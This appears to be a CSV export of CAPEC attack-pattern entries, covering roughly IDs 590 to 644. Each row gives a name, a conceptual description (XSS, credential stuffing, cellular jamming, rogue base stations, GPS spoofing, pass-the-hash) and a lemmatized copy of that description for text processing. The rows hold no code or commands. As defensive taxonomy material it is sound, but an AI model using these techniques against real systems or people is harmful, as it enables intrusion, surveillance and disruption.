CAPEC-590,IP Address Blocking,An adversary performing this type of attack drops packets destined for a target IP address. The aim is to prevent access to the service hosted at the target IP address.,adversary perform type attack drop packet destine target ip address aim prevent access service host target ip address
CAPEC-591,Reflected XSS,"This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is ""reflected"" off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application.The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.",type attack form cross site scripting xss malicious script reflect vulnerable web application execute victim browser process start adversary deliver malicious script victim convince victim send script vulnerable web application common method phishing email adversary embed malicious script url victim click process subsequent request vulnerable web application incorrectly consider malicious script valid input use creates reposnse send victim launch successful reflected xss attack adversary look place user input directly generation response involve element expect host script image tag img addition event attibute onload onmouseover element subject input validation output encoding content filtering checking routine
CAPEC-592,Stored XSS,"An adversary utilizes a form of Cross-site Scripting (XSS) where a malicious script is persistently ""stored"" within the data storage of a vulnerable web application as valid input.Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attributes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.",adversary utilize form cross site scripting xss malicious script persistently store datum storage vulnerable web application valid input initially present adversary vulnerable web application malicious script incorrectly consider valid input properly encode web application victim convince use web application way create response include malicious script response subsequently send victim malicious script execute victim browser launch successful store xss attack adversary look place store input datum generation response involve element expect host script image tag img addition event attribute onload onmouseover element subject input validation output encoding content filtering checking routine
CAPEC-593,Session Hijacking,This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The adversary is able to steal or manipulate an active session and use it to gain unathorized access to the application.,type attack involve adversary exploit weakness application use session perform authentication adversary able steal manipulate active session use gain unathorized access application
CAPEC-594,Traffic Injection,"An adversary injects traffic into the target's network connection. The adversary is therefore able to degrade or disrupt the connection, and potentially modify the content. This is not a flooding attack, as the adversary is not focusing on exhausting resources. Instead, the adversary is crafting a specific input to affect the system in a particular way.",adversary inject traffic target network connection adversary able degrade disrupt connection potentially modify content flooding attack adversary focus exhaust resource instead adversary craft specific input affect system particular way
CAPEC-595,Connection Reset,"In this attack pattern, an adversary injects a connection reset packet to one or both ends of a target's connection. The attacker is therefore able to have the target and/or the destination server sever the connection without having to directly filter the traffic between them.",attack pattern adversary inject connection reset packet end target connection attacker able target destination server sever connection have directly filter traffic
CAPEC-596,TCP RST Injection,An adversary injects one or more TCP RST packets to a target after the target has made a HTTP GET request. The goal of this attack is to have the target and/or destination web server terminate the TCP connection.,adversary inject tcp rst packet target target http request goal attack target destination web server terminate tcp connection
CAPEC-597,Absolute Path Traversal,"An adversary with access to file system resources, either directly or via application logic, will use various file absolute paths and navigation mechanisms such as "".."" to extend their range of access to inappropriate areas of the file system. The goal of the adversary is to access directories and files that are intended to be restricted from their access.",adversary access file system resource directly application logic use file absolute path navigation mechanism extend range access inappropriate area file system goal adversary access directory file intend restrict access
CAPEC-598,DNS Spoofing,"An adversary sends a malicious (""NXDOMAIN"" (""No such domain"") code, or DNS A record) response to a target's route request before a legitimate resolver can. This technique requires an On-path or In-path device that can monitor and respond to the target's DNS requests. This attack differs from BGP Tampering in that it directly responds to requests made by the target instead of polluting the routing the target's infrastructure uses.",adversary send malicious nxdomain domain code dns record response target route request legitimate resolver technique require path path device monitor respond target dns request attack differ bgp tampering directly respond request target instead pollute routing target infrastructure use
CAPEC-599,Terrestrial Jamming,"In this attack pattern, the adversary transmits disruptive signals in the direction of the target's consumer-level satellite dish (as opposed to the satellite itself). The transmission disruption occurs in a more targeted range. Portable terrestrial jammers have a range of 3-5 kilometers in urban areas and 20 kilometers in rural areas. This technique requires a terrestrial jammer that is more powerful than the frequencies sent from the satellite.",attack pattern adversary transmit disruptive signal direction target consumer level satellite dish oppose satellite transmission disruption occur target range portable terrestrial jammer range kilometer urban area kilometer rural area technique require terrestrial jammer powerful frequency send satellite
CAPEC-6,Argument Injection,An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.,attacker change behavior state target application inject datum command syntax target use non validated non filtered argument expose service method
CAPEC-60,Reusing Session IDs (aka Session Replay),This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.,attack target reuse valid session id spoof target system order gain privilege attacker try reuse steal session id previously transaction perform spoofing session hijacking type attack session replay
CAPEC-600,Credential Stuffing,"An adversary tries known username/password combinations against different systems, applications, or services to gain additional authenticated access. Credential Stuffing attacks rely upon the fact that many users leverage the same username/password combination for multiple systems, applications, and services.Attacks of this kind often target management services over commonly used ports such as SSH, FTP, Telnet, LDAP, Kerberos, MySQL, and more. Additional targets include Single Sign-On (SSO) or cloud-based applications/services that utilize federated authentication protocols, and externally facing applications.The primary goal of Credential Stuffing is to achieve lateral movement and gain authenticated access to additional systems, applications, and/or services. A successfully executed Credential Stuffing attack could result in the adversary impersonating the victim or executing any action that the victim is authorized to perform.Although not technically a brute force attack, Credential Stuffing attacks can function as such if an adversary possess multiple known passwords for the same user account. This may occur in the event where an adversary obtains user credentials from multiple sources or if the adversary obtains a user's password history for an account.Credential Stuffing attacks are similar to Password Spraying attacks (CAPEC-565) regarding their targets and their overall goals. However, Password Spraying attacks do not have any insight into known username/password combinations and instead leverage common or expected passwords. This also means that Password Spraying attacks must avoid inducing account lockouts, which is generally not a worry of Credential Stuffing attacks. Password Spraying attacks may additionally lead to Credential Stuffing attacks, once a successful username/password combination is discovered.",adversary try know username password combination different system application service gain additional authenticate access credential stuffing attack rely fact user leverage username password combination multiple system application service attack kind target management service commonly port ssh ftp telnet ldap kerberos mysql additional target include single sign sso cloud base application service utilize federated authentication protocol externally face application primary goal credential stuffing achieve lateral movement gain authenticate access additional system application service successfully execute credential stuffing attack result adversary impersonate victim execute action victim authorize perform technically brute force attack credential stuffing attack function adversary possess multiple know password user account occur event adversary obtain user credential multiple source adversary obtain user password history account credential stuffing attack similar password spraying attack target overall goal password spraying attack insight know username password combination instead leverage common expected password mean password spraying attack avoid induce account lockout generally worry credential stuffing attack password spraying attack additionally lead credential stuffing attack successful username password combination discover
CAPEC-601,Jamming,"An adversary uses radio noise or signals in an attempt to disrupt communications. By intentionally overwhelming system resources with illegitimate traffic, service is denied to the legitimate traffic of authorized users.",adversary use radio noise signal attempt disrupt communication intentionally overwhelm system resource illegitimate traffic service deny legitimate traffic authorized user
CAPEC-603,Blockage,An adversary blocks the delivery of an important system resource causing the system to fail or stop working.,adversary block delivery important system resource cause system fail stop work
CAPEC-604,Wi-Fi Jamming,"In this attack scenario, the attacker actively transmits on the Wi-Fi channel to prevent users from transmitting or receiving data from the targeted Wi-Fi network. There are several known techniques to perform this attack – for example: the attacker may flood the Wi-Fi access point (e.g. the retransmission device) with deauthentication frames. Another method is to transmit high levels of noise on the RF band used by the Wi-Fi network.",attack scenario attacker actively transmit wi fi channel prevent user transmit receive datum target wi fi network know technique perform attack example attacker flood wi fi access point retransmission device deauthentication frame method transmit high level noise rf band wi fi network
CAPEC-605,Cellular Jamming,"In this attack scenario, the attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. Several existing techniques are known in the open literature for this attack for 2G, 3G, and 4G LTE cellular technology. For example, some attacks target cell towers by overwhelming them with false status messages, while others introduce high levels of noise on signaling channels.",attack scenario attacker actively transmit signal overpower disrupt communication cellular user device cell tower exist technique know open literature attack g g g lte cellular technology example attack target cell tower overwhelm false status message introduce high level noise signaling channel
CAPEC-606,Weakening of Cellular Encryption,"An attacker, with control of a Cellular Rogue Base Station or through cooperation with a Malicious Mobile Network Operator can force the mobile device (e.g., the retransmission device) to use no encryption (A5/0 mode) or to use easily breakable encryption (A5/1 or A5/2 mode).",attacker control cellular rogue base station cooperation malicious mobile network operator force mobile device retransmission device use encryption mode use easily breakable encryption mode
CAPEC-607,Obstruction,"An attacker obstructs the interactions between system components. By interrupting or disabling these interactions, an adversary can often force the system into a degraded state or cause the system to stop working as intended. This can cause the system components to be unavailable until the obstruction mitigated.",attacker obstruct interaction system component interrupt disable interaction adversary force system degraded state cause system stop work intend cause system component unavailable obstruction mitigate
CAPEC-608,Cryptanalysis of Cellular Encryption,"The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices.",use cryptanalytic technique derive cryptographic key effectively defeat cellular encryption reveal traffic content cellular encryption algorithm specify gsm use know vulnerable attack commercial tool available execute attack decrypt mobile phone conversation real time new encryption algorithm use umts lte strong currently believe vulnerable type attack note attacker cellular rogue base station force use weak cellular encryption new mobile device
CAPEC-609,Cellular Traffic Intercept,"Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.",cellular traffic voice datum mobile device retransmission device intercept numerous method malicious actor deploy cellular tower equipment intercept cellular traffic surreptitiously additionally government agency adversary malicious actor intercept cellular traffic telecommunication backbone mobile traffic transmit
CAPEC-61,Session Fixation,"The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.",attacker induce client establish session target software session identifier provide attacker user successfully authenticate target software attacker use privileged session identifier transaction attack leverage fact target software rely client generate session identifier maintain session identifier privilege elevation
CAPEC-610,Cellular Data Injection,Adversaries inject data into mobile technology traffic (data flows or signaling data) to disrupt communications or conduct additional surveillance operations.,adversary inject datum mobile technology traffic data flow signaling datum disrupt communication conduct additional surveillance operation
CAPEC-611,BitSquatting,"An adversary registers a domain name one bit different than a trusted domain. A BitSquatting attack leverages random errors in memory to direct Internet traffic to adversary-controlled destinations. BitSquatting requires no exploitation or complicated reverse engineering, and is operating system and architecture agnostic. Experimental observations show that BitSquatting popular websites could redirect non-trivial amounts of Internet traffic to a malicious entity.",adversary register domain bit different trust domain bitsquatting attack leverage random error memory direct internet traffic adversary control destination bitsquatting require exploitation complicated reverse engineering operating system architecture agnostic experimental observation bitsquatting popular website redirect non trivial amount internet traffic malicious entity
CAPEC-612,WiFi MAC Address Tracking,"In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future.",attack scenario attacker passively listen wifi message log associate media access control mac address address intend unique wireless device configure change software attacker able associate mac address particular user set user example attend public event attacker scan mac address track user future
CAPEC-613,WiFi SSID Tracking,"In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future.",attack scenario attacker passively listen wifi management frame message contain service set identifier ssid wifi network message frequently transmit wifi access point retransmission device client access network handset mobile device attacker able associate ssid particular user set user example attend public event attacker scan ssid track user future
CAPEC-614,Rooting SIM Cards,"SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse.",sim card de facto trust anchor mobile device worldwide card protect mobile identity subscriber associate device phone number increasingly store payment credential example nfc enable phone mobile wallet attack leverage air ota update deploy cryptographically secure sms message deliver executable code sim crack des key attacker send properly sign binary sms message device treat java applet execute sim applet allow send sms change voicemail number query phone location predefine function capability provide plenty potential abuse
CAPEC-615,Evil Twin Wi-Fi Attack,"Adversaries install Wi-Fi equipment that acts as a legitimate Wi-Fi network access point. When a device connects to this access point, Wi-Fi data traffic is intercepted, captured, and analyzed. This also allows the adversary to use ""adversary-in-the-middle"" (CAPEC-94) for all communications.",adversary install wi fi equipment act legitimate wi fi network access point device connect access point wi fi datum traffic intercept capture analyze allow adversary use adversary middle communication
CAPEC-616,Establish Rogue Location,"An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.",adversary provide malicious version resource location similar expected location legitimate resource establish rogue location adversary wait victim visit location access malicious resource
CAPEC-617,Cellular Rogue Base Station,"In this attack scenario, the attacker imitates a cellular base station with their own ""rogue"" base station equipment. Since cellular devices connect to whatever station has the strongest signal, the attacker can easily convince a targeted cellular device (e.g. the retransmission device) to talk to the rogue base station.",attack scenario attacker imitate cellular base station rogue base station equipment cellular device connect station strong signal attacker easily convince target cellular device retransmission device talk rogue base station
CAPEC-618,Cellular Broadcast Message Request,"In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence or absence of that message, an attacker could verify that the target is in (or not in) a given location.",attack scenario attacker use knowledge target mobile phone number number associate sim retransmission device cause cellular network send broadcast message alert mobile device network know cell tower target mobile device attach broadcast message send location area code lac target currently locate trigger cellular broadcast message listen presence absence message attacker verify target give location
CAPEC-619,Signal Strength Tracking,"In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking.",attack scenario attacker passively monitor signal strength target cellular rf signal wifi rf signal use strength signal directional antenna multiple listening point identify source location signal obtain signal target accomplish multiple technique cellular broadcast message request use imsi tracking wifi mac address tracking
CAPEC-62,Cross Site Request Forgery,"An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply ""riding"" the existing session cookie.",attacker craft malicious web link distribute web page email etc typically target manner hope induce user click link execute malicious action party application successful action embed malicious link process accept target application user privilege level type attack leverage persistence implicit trust place user session cookie web application today architecture user authenticate application session cookie create user system follow transaction session authenticate cookie include potential action initiate attacker simply ride exist session cookie
CAPEC-620,Drop Encryption Level,"An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data.",attacker force encryption level lower enable successful attack encrypt datum
CAPEC-621,Analysis of Packet Timing and Sizes,"An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients).",attacker intercept log encrypt transmission purpose analyze metadata packet timing size actual datum encrypt metadata reveal valuable information attacker note attack applicable voip datum application datum especially interactive app require precise timing low latency thin client
CAPEC-622,Electromagnetic Side-Channel Attack,"In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing). This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack.",attack scenario attacker passively monitor electromagnetic emanation produce target electronic device unintentional effect processing emanation attacker derive information datum process attacker recover cryptographic key monitor emanation associate cryptographic processing style attack require proximal access device attack demonstrate public conference work distance foot significant study determine maximum practical distance attack attack passive nearly impossible detect target device continue operate normal successful attack
CAPEC-623,Compromising Emanations Attack,"Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing.",compromising emanation ce define unintentional signal attacker intercept analyze disclose information process target equipment commercial mobile device retransmission device display button microchip radio emit mechanical emission form sound vibration capture emission help adversary understand device
CAPEC-624,Hardware Fault Injection,"The adversary uses disruptive signals or events, or alters the physical environment a device operates in, to cause faulty behavior in electronic devices. This can include electromagnetic pulses, laser pulses, clock glitches, ambient temperature extremes, and more. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information.",adversary use disruptive signal event alter physical environment device operate cause faulty behavior electronic device include electromagnetic pulse laser pulse clock glitch ambient temperature extreme perform control manner device perform cryptographic operation faulty behavior exploit derive secret key information
CAPEC-625,Mobile Device Fault Injection,"Fault injection attacks against mobile devices use disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information. Although this attack usually requires physical control of the mobile device, it is non-destructive, and the device can be used after the attack without any indication that secret keys were compromised.",fault injection attack mobile device use disruptive signal event electromagnetic pulse laser pulse clock glitch etc cause faulty behavior perform control manner device perform cryptographic operation faulty behavior exploit derive secret key information attack usually require physical control mobile device non destructive device attack indication secret key compromise
CAPEC-626,Smudge Attack,Attacks that reveal the password/passcode pattern on a touchscreen device by detecting oil smudges left behind by the user’s fingers.,attack reveal password passcode pattern touchscreen device detect oil smudge leave user finger
CAPEC-627,Counterfeit GPS Signals,"An adversary attempts to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These spoofed signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.",adversary attempt deceive gps receiver broadcast counterfeit gps signal structure resemble set normal gps signal spoofed signal structure way cause receiver estimate position actually locate different time determine adversary
CAPEC-628,Carry-Off GPS Attack,"A common form of a GPS spoofing attack, commonly termed a carry-off attack begins with an adversary broadcasting signals synchronized with the genuine signals observed by the target receiver. The power of the counterfeit signals is then gradually increased and drawn away from the genuine signals. Over time, the adversary can carry the target away from their intended destination and toward a location chosen by the adversary.",common form gps spoofing attack commonly term carry attack begin adversary broadcast signal synchronize genuine signal observe target receiver power counterfeit signal gradually increase draw away genuine signal time adversary carry target away intended destination location choose adversary
CAPEC-63,Cross-Site Scripting (XSS),"An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.",adversary embed malicious script content serve web browser goal attack target software client browser execute script user privilege level attack type exploit program vulnerability bring allow remote host execute code script web browser example simple security control place remote attacker allow execute script inject user generate content like bulletin board control bypass attack difficult end user detect
CAPEC-630,TypoSquatting,"An adversary registers a domain name with at least one character different than a trusted domain. A TypoSquatting attack takes advantage of instances where a user mistypes a URL (e.g. www.goggle.com) or not does visually verify a URL before clicking on it (e.g. phishing attack). As a result, the user is directed to an adversary-controlled destination. TypoSquatting does not require an attack against the trusted domain or complicated reverse engineering.",adversary register domain character different trust domain typosquatting attack take advantage instance user mistype url visually verify url click phishing attack result user direct adversary control destination typosquatting require attack trust domain complicated reverse engineering
CAPEC-631,SoundSquatting,"An adversary registers a domain name that sounds the same as a trusted domain, but has a different spelling. A SoundSquatting attack takes advantage of a user's confusion of the two words to direct Internet traffic to adversary-controlled destinations. SoundSquatting does not require an attack against the trusted domain or complicated reverse engineering.",adversary register domain sound trusted domain different spelling soundsquatting attack take advantage user confusion word direct internet traffic adversary control destination soundsquatting require attack trust domain complicated reverse engineering
CAPEC-632,Homograph Attack via Homoglyphs,"An adversary registers a domain name containing a homoglyph, leading the registered domain to appear the same as a trusted domain. A homograph attack leverages the fact that different characters among various character sets look the same to the user. Homograph attacks must generally be combined with other attacks, such as phishing attacks, in order to direct Internet traffic to the adversary-controlled destinations.",adversary register domain contain homoglyph lead register domain appear trust domain homograph attack leverage fact different character character set look user homograph attack generally combine attack phishing attack order direct internet traffic adversary control destination
CAPEC-633,Token Impersonation,"An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.",adversary exploit weakness authentication create access token equivalent impersonate different entity associate process thread impersonated token action cause downstream user decision action base assumed identity response block adversary
CAPEC-634,Probe Audio and Video Peripherals,"The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system.",adversary exploit target system audio video functionality malware schedule task goal capture sensitive information target financial personal political gain accomplish collect communication datum party use peripheral device microphone webcam application audio video capability skype system
CAPEC-635,Alternative Execution Due to Deceptive Filenames,"The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information.",extension file context determine application open use attacker cause alternative application able execute malicious code cause denial service expose sensitive information
CAPEC-636,Hiding Malicious Data or Code within Files,"Files on various operating systems can have a complex format which allows for the storage of other data, in addition to its contents. Often this is metadata about the file, such as a cached thumbnail for an image file. Unless utilities are invoked in a particular way, this data is not visible during the normal use of the file. It is possible for an attacker to store malicious data or code using these facilities, which would be difficult to discover.",file operate system complex format allow storage datum addition content metadata file cache thumbnail image file utility invoke particular way data visible normal use file possible attacker store malicious datum code facility difficult discover
CAPEC-637,Collect Data from Clipboard,"The adversary exploits an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. Data copied to the clipboard can be accessed by other applications, such as malware built to exfiltrate or log clipboard contents on a periodic basis. In this way, the adversary aims to garner information to which they are unauthorized.",adversary exploit application allow copying sensitive datum information collect information copy clipboard datum copy clipboard access application malware build exfiltrate log clipboard content periodic basis way adversary aim garner information unauthorized
CAPEC-638,Altered Component Firmware,"An adversary exploits systems features and/or improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), with the goal of executing malicious code from within the component's Master Boot Record (MBR). Conducting this type of attack entails the adversary infecting the target with firmware altering malware, using known tools, and a payload. Once this malware is executed, the MBR is modified to include instructions to execute the payload at desired intervals and when the system is booted up. A successful attack will obtain persistence within the victim system even if the operating system is reinstalled and/or if the component is formatted or has its data erased.",adversary exploit system feature improperly protect firmware hardware component hard disk drives hdd goal execute malicious code component master boot record mbr conduct type attack entail adversary infect target firmware alter malware known tool payload malware execute mbr modify include instruction execute payload desire interval system boot successful attack obtain persistence victim system operate system reinstall component format datum erase
CAPEC-639,Probe System Files,"An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.",adversary obtain unauthorized information improperly protect file application store sensitive information file protect proper access control adversary access file search sensitive information
CAPEC-64,Using Slashes and URL Encoding Combined to Bypass Validation Logic,"This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.",attack target encoding url combine encoding slash character attacker advantage multiple way encode url abuse interpretation url url contain special character need special syntax handling order interpret special character represent percentage character follow digit represent octet code original character hex code instance ascii space character represent refer escape ending percent encoding server decode url request restrict access url path validate filter url request receive attacker try craft url sequence special character interpret server equivalent forbid url difficult protect attack url contain format encoding encoding unicode encoding etc
CAPEC-640,Inclusion of Code in Existing Process,"The adversary takes advantage of a bug in an application failing to verify the integrity of the running process to execute arbitrary code in the address space of a separate live process. The adversary could use running code in the context of another process to try to access process's memory, system/network resources, etc. The goal of this attack is to evade detection defenses and escalate privileges by masking the malicious code under an existing legitimate process. Examples of approaches include but not limited to: dynamic-link library (DLL) injection, portable executable injection, thread execution hijacking, ptrace system calls, VDSO hijacking, function hooking, reflective code loading, and more.",adversary take advantage bug application fail verify integrity run process execute arbitrary code address space separate live process adversary use run code context process try access process memory system network resource etc goal attack evade detection defense escalate privilege mask malicious code exist legitimate process example approach include limit dynamic link library dll injection portable executable injection thread execution hijacking ptrace system call vdso hijacking function hooking reflective code loading
CAPEC-641,DLL Side-Loading,"An adversary places a malicious version of a Dynamic-Link Library (DLL) in the Windows Side-by-Side (WinSxS) directory to trick the operating system into loading this malicious DLL instead of a legitimate DLL. Programs specify the location of the DLLs to load via the use of WinSxS manifests or DLL redirection and if they aren't used then Windows searches in a predefined set of directories to locate the file. If the applications improperly specify a required DLL or WinSxS manifests aren't explicit about the characteristics of the DLL to be loaded, they can be vulnerable to side-loading.",adversary place malicious version dynamic link library dll windows winsxs directory trick operate system load malicious dll instead legitimate dll program specify location dll load use winsxs manifest dll redirection windows search predefined set directory locate file application improperly specify required dll winsxs manifest explicit characteristic dll load vulnerable loading
CAPEC-642,Replace Binaries,"Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.",adversary know certain binary regularly execute normal processing binary protect appropriate file system permission possible replace malware malware execute high system permission level variation pattern discover self extract installation package unpack binary directory weak file permission clean appropriately binary replace malware execute
CAPEC-643,Identify Shared Files/Directories on System,"An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network.",adversary discover connection system exploit target system standard practice reveal searchable common area identification share folder drive system adversary goal locate collect sensitive information file map potential route lateral movement network
CAPEC-644,Use of Captured Hashes (Pass The Hash),"An adversary obtains (i.e. steals or purchases) legitimate Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.When authenticating via LM or NTLM, an authenticating account's plaintext credentials are not required by the protocols for successful authentication. Instead, the hashed credentials are used to determine if an authentication attempt is valid. If an adversary can obtain an account's hashed credentials, the hash values can then be passed to a system or service to authenticate, without needing to brute-force the hashes to obtain their cleartext values. Successful Pass The Hash attacks result in the adversary fully authenticating as the targeted account, which can further allow the adversary to laterally move within the network, impersonate a legitimate user, and/or download/install malware to systems within the domain. This technique can be performed against any operating system that leverages the LM or NTLM protocols even if the operating system is not Windows-based, since these systems/accounts may still authenticate to a Windows domain.",adversary obtain steal purchase legitimate windows domain credential hash value access system domain leverage lan man lm nt lan man ntlm authentication protocol authenticate lm ntlm authenticate account plaintext credential require protocol successful authentication instead hashed credential determine authentication attempt valid adversary obtain account hashed credential hash value pass system service authenticate need brute force hash obtain cleartext value successful pass hash attack result adversary fully authenticate target account allow adversary laterally network impersonate legitimate user download install malware system domain technique perform operate system leverage lm ntlm protocol operate system windows base system account authenticate windows domain
